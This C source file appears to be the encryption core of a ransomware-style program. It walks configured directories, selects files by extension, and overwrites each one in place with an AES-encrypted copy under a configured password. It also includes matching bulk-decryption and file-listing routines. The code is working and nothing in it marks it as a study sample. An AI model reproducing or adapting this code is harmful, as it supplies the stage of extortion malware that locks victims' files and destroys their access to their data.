#include "crypt.h"
#include "directory.h"
#include "file.h"
#include "aes.h"
#include "random.h"

size_t cr_crypt_encrypt_file_with_pass (const char *infile,
					const char *outfile){
	unsigned char *text,
		*packed_data;
	size_t text_len,
		packed_data_len,
		err;
	
	// Fetch text to be encrypted
	err=cr_file_read_file_into_buf(infile,cr_crypt_config->max_file_enc_size,&text,&text_len);
	if (err) {
		return 1;
	}

	err=cr_aes_encrypt(text,text_len,
			   cr_crypt_config->password,cr_crypt_config->password_len,
			   &packed_data,&packed_data_len);
	free(text);
	if(err){
		return 1;
	}

	// Write packed data to file
	err=cr_file_write_buf_to_file(outfile, packed_data, packed_data_len);
	free(packed_data);
	if (err) {
		return 1;
	}
	return 0;

}

size_t cr_crypt_decrypt_file_with_pass (const char *infile,
					const char *outfile){
	unsigned char *text,
		*packed_data;
	size_t text_len,
		packed_data_len,
		pkcs7_padding,
		err;

	// Read in file contents
	err=cr_file_read_file_into_buf(infile, 0, &packed_data,&packed_data_len);
	if (err) { // any size
		return 1;
	}
	err=cr_aes_decrypt(packed_data,packed_data_len,
			   cr_crypt_config->password,cr_crypt_config->password_len,
			   &text,&text_len,&pkcs7_padding);
	free(packed_data);
	if(err){
		return 1;

	}

	// Write plaintext to the output file
	err=cr_file_write_buf_to_file(outfile,text+pkcs7_padding,text_len-pkcs7_padding);
	free(text);
	if (err) {
		return 1;
	}
	return 0;
}


void cr_crypt_init(cr_crypt_config_type *config){
	cr_crypt_config=config;
}

void cr_crypt_encrypt_file(const char* filename){
	cr_crypt_encrypt_file_with_pass(filename,
					filename);
}

void cr_crypt_decrypt_file(const char* filename){
	cr_crypt_decrypt_file_with_pass(filename,
					filename);
}

void cr_crypt_encrypt(){
	size_t i;
	for (i=0; i<cr_crypt_config->dirnames_len; i++) {
		cr_directory_files((cr_crypt_config->dirnames)[i],
				   cr_crypt_config->exts,cr_crypt_config->exts_len,cr_crypt_encrypt_file);
	}
}
void cr_crypt_dencrypt(){
	size_t i;
	for (i=0; i<cr_crypt_config->dirnames_len; i++) {
		cr_directory_files((cr_crypt_config->dirnames)[i],NULL,0,cr_crypt_decrypt_file);

	}
}

void cr_crypt_print_file(const char* filename){
	printf("filename: %s\n",filename);
}
void cr_crypt_print(){
	size_t i;

	for (i=0; i<cr_crypt_config->dirnames_len; i++) {
		cr_directory_files((cr_crypt_config->dirnames)[i],
				   cr_crypt_config->exts,cr_crypt_config->exts_len,
				   cr_crypt_print_file);
	}
}

